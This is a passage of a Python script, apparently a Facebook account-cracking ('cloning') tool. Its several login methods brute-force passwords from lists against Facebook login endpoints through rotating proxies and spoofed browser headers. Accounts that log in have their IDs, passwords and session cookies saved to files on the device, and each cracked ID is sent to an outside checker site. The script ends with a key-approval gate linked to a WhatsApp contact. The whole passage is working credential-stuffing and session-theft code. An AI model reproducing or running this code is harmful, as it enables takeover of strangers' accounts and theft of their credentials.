    sys.stdout.write(f'\r\r{B}[{G}EMON PAGLA 🍬-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            uax = random.choice(uadef)
            uax = random.choice(ugen2)
            datax = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'logged_out_id': str(uuid.uuid4()),
                'hash_id': str(uuid.uuid4()),
                'reg_instance': str(uuid.uuid4()),
                'session_id': str(uuid.uuid4()),
                'advertiser_id': str(uuid.uuid4()),
                'email': uid,
                'password': pas,
                'generate_analytics_claims': '1',
                'source':'login',
                'sim_country': 'id',
                'network_country': 'id',
                'relative_url': 'method/auth.login',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate'
            }
            headers = {'authority': 'www.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.facebook.com/?_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Google Chrome";v="130", "Chromium";v="130"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="130", "Chromium";v="130"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '"TECNO KL5"',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'manifest',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Wayland like X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6784.66 Safari/537.36',}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=datax, headers=headers, proxies=max).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                res = requests.get(f'https://rajx.pythonanywhere.com/live?uid={uid}').text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[Emon🔥OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                    with open('/sdcard/Emon-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;31;40m|E-S2-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                print(f'\r\r{B}[{Y}-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/-S2-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid, passlist):
    global loop
    global cps
    global oks
    global proxy
    global ugen2
    for pas in passlist:
        try:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            uax = random.choice(user_agents)
            uax = random.choice(uadef)
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            fb = "m"
            free_fb = session.get(f'https://{fb}.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            header_freefb = {
                "authority": f'{fb}.facebook.com',
                "method": 'POST',
                "scheme": 'https',
                "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                "accept-encoding": 'gzip, deflate, br',
                "accept-language": 'en-US,en;q=1',
                "cache-control": 'no-cache, no-store, must-revalidate',
                "referer": f'https://{fb}.facebook.com/',
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": '?0',
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": 'document',
                "sec-fetch-mode": 'navigate',
                "sec-fetch-site": 'same-origin',
                "sec-fetch-user": '?1',
                "pragma": 'no-cache',
                "priority": 'u=1',
                "cross-origin-resource-policy": 'cross-origin',
                "upgrade-insecure-requests": '1',
                'user-agent': uax,
            }
            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                sort = coki.split("sb=")[1]
                coki1 = coki.split("1000")[1]
                xd = "1000" + coki1[0:11]
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://rajx.pythonanywhere.com/live?uid={uid}'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[EmoN🔥-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                    with open('/sdcard/emon--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|Emon-S4-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[Emon-𝟸𝙵] {uid} [💙] {pas} ')
                    with open('/sdcard/-𝟸𝙵💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    print(f'\r\033[1;30m[Emon--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/--𝙲𝙿💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#______________#
"""def rndm3(uid, passlist):
    global oks, cps, ugen, loop
    sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        for pas in passlist:
            fb = "m"
            uuu = random.choice(ugen)
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            update = {
                "authority": f'{fb}.facebook.com',
                "method": 'POST',
                "scheme": 'https',
                "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                "accept-encoding": 'gzip, deflate, br',
                "accept-language": 'en-US,en;q=1',
                "cache-control": 'no-cache, no-store, must-revalidate',
                "referer": f'https://{fb}.facebook.com/',
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": '?0',
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": 'document',
                "sec-fetch-mode": 'navigate',
                "sec-fetch-site": 'same-origin',
                "sec-fetch-user": '?1',
                "pragma": 'no-cache',
                "priority": 'u=1',
                "cross-origin-resource-policy": 'cross-origin',
                "upgrade-insecure-requests": '1',
                "user-agent": uuu,
            }
            lo = session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", data=info, headers=update).text
            shajonn = session.cookies.get_dict().keys()
            if 'c_user' in shajonn:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                sort = coki.split("sb=")[1]
                coki1 = coki.split("1000")[1]
                xd = "1000" + coki1[0:11]
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://rajx.pythonanywhere.com/live?uid={uid}'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[Emon🔥-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                    with open('/sdcard/Emon🔥--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|Emon Pagla-S4-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                break
            elif 'checkpoint' in shajonn:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[--𝟸𝙵] {uid} [💙] {pas} ')
                    with open('/sdcard/--𝟸𝙵💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    print(f'\r\033[1;30m[Emon--CP] {uid} | {pas} ')
                    with open('/sdcard/--𝙲𝙿🥺💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(31)
    except Exception as e:
        pass
    loop += 1"""
#__________________| RANDOM METHOD M4 |__________________#
def rndm4(uid, passlist):
    global loop
    global cps
    global oks
    global proxy
    global ugen2
    for pas in passlist:
        try:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            uax = random.choice(ugen)
            uax = random.choice(uadef)
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            free_fb = session.get('https://web.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            header_freefb = {
                'authority': 'web.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': uax,
            }
            lo = session.post('https://www.facebook.com/login/?_rdc=2&_rdr',data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[SHAJON-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                    with open('/sdcard/Emon🔥--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|Emon Pagla-S4-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[P--𝟸𝙵] {uid} [💙] {pas} ')
                    with open('/sdcard/P--𝟸𝙵💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    print(f'\r\033[1;30m[c--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/--𝙲𝙿🥺💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#__________________| RANDOM METHOD M5 |__________________#
def rndm5(uid, passlist):
    global loop
    global cps
    global oks
    global proxy
    global ugen2
    for pas in passlist:
        try:
            prox = random.choice(proxy)
            max = {'http': 'socks4://' + prox}
            uax = random.choice(uadef)
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pas,
                "login": "Log In"
            }
            header_freefb = {
                'authority': 'p.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'dpr': '2.9000000953674316',
                'referer': 'https://p.facebook.com/login.php?next=https%3A%2F%2Fp.facebook.com%2F&refsrc=deprecated&wtsid=rdr_0rUMBKuFVOobOGUjz&_rdr',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"TECNO CK7n"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"14.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': uax,
                'viewport-width': '980',
            }
            lo = session.post('https://p.facebook.com/login/?next=https%3A%2F%2Fp.facebook.com%2F&ref=dbl&fl&login_from_aymh=1&refid=9',data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if res == 'LIVE':
                    print(f'\r\x1b[1;92m[EMON🔥-OK] {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                    with open('/sdcard/EMON PAGLA--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m[P| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[P--𝟸𝙵] {uid} [💙] {pas} ')
                    with open('/sdcard/P--𝟸𝙵💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    print(f'\r\033[1;30m[P--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/P-𝙲𝙿🥺💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            pass
    loop += 1
#__________________[ SYSTEM-CONTROL ]__________________#
try:
    os.system('touch prox.txt')
except:
    pass
def approval():
    a = str(os.geteuid())
    b = str(os.getlogin())
    y = ":".join(b + a)
    key = f"Pagla{y}"
    row = httpx.get("https://github.com/Gojosaturo100pro/xemon/blob/main/xemon.txt").text
    if key in row:
        #loading()
        os.system("clear")
        print(logo)
        jalan('--> \033[1;95mITS WARKING ✅')
        time.sleep(2)
        menu()
    else:
        os.system("clear")
        print(logo)
        time.sleep(1)
        print("\033[1;91m--> YOUR KEY 🗝️ WARKING ❌")
        time.sleep(2)
        print("\033[1;92m--> wtup+8801867850909.....✅")
        jalan('  \033[1;95m═══════════════════════════════════════════════════')
        print("\033[1;91m-->\033[1;32m KEY 🗝️: " + key)
        jalan('  \033[1;95m═══════════════════════════════════════════════════')
        input("\033[1;31m-->\033[1;32m𝙋𝙧𝙚𝙨𝙨 𝙀𝙣𝙩𝙚𝙧 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙠𝙚𝙮 𝙖𝙙𝙢𝙞𝙣...✅")
        os.system("xdg-open 'https://wa.me/+8801867850909'")
        sys.exit()
approval()